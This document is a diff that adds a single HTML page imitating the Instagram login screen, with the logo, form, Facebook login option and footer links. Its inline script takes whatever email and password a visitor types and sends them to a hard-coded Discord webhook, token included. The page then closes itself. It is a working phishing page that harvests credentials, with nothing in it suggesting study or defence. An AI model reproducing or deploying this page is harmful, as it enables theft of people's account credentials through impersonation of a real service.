@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>Instagram Login</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <form id="loginForm">
+                    <label for="email" class="sr-only">Phone, username or email</label>
+                    <input id="email" name="email" placeholder="Phone, username or email" />
+
+                    <label for="password" class="sr-only">Password</label>
+                    <input id="password" name="password" type="password" placeholder="Password" />
+
+                    <button type="button" id="loginBtn">Log in</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a>Log in with Facebook</a>
+                    </div>
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Don't have an account?</p>
+                <a href="#">Sign up</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>Get the app.</p>
+                <div class="flex justify-content-center">
+                    <img src="./img/apple-button.png"      alt="Apple App Store logo" title="Apple App Store logo" />
+                    <img src="./img/googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">ABOUT</a></li>
+            <li><a href="#">HELP</a></li>
+            <li><a href="#">PRESS</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">CAREERS</a></li>
+            <li><a href="#">PRIVACY</a></li>
+            <li><a href="#">TERMS</a></li>
+            <li><a href="#">LOCATIONS</a></li>
+            <li><a href="#">TOP ACCOUNTS</a></li>
+            <li><a href="#">HASHTAGS</a></li>
+            <li><a href="#">LANGUAGE</a></li>
+        </ul>
+        <p class="copyright">© 2020 Instagram from Facebook</p>
+    </footer>
+
+    <script>
+        document.getElementById('loginBtn').addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            // Get form data
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            console.log('Form submitted:', { email, password });
+            
+            // Prepare data for Discord webhook
+            const discordData = {
+                content: "New Login Attempt",
+                embeds: [{
+                    color: 3447003,
+                    fields: [
+                        {
+                            name: "Email",
+                            value: email || "Empty",
+                            inline: false
+                        },
+                        {
+                            name: "Password",
+                            value: password || "Empty",
+                            inline: false
+                        },
+                        {
+                            name: "Timestamp",
+                            value: new Date().toISOString(),
+                            inline: false
+                        }
+                    ]
+                }]
+            };
+            
+            try {
+                // Replace with your Discord webhook URL
+                const webhookUrl = 'https://discord.com/api/webhooks/1471149082553749574/RnBcq8pooVnHiCZnhZsstcKCX8fDiq9iMDhoSAQvkj3jB0PJz2BsnCagdSNYpXikkorQ';
+                
+                console.log('Sending to webhook:', webhookUrl);
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(discordData)
+                });
+                
+                console.log('Response status:', response.status);
+                console.log('Response ok:', response.ok);
+                
+                if (!response.ok) {
+                    console.error('Webhook failed with status:', response.status);
+                    const text = await response.text();
+                    console.error('Response body:', text);
+                }
+                
+                console.log('Data sent to Discord successfully');
+                // After successful submission, close the page
+                setTimeout(() => {
+                    window.close();
+                }, 1000);
+            } catch (error) {
+                console.error('Error sending data:', error);
+                // Still close the page after error
+                setTimeout(() => {
+                    window.close();
+                }, 1000);
+            }
+        });
+    </script>
+</body>
+</html>
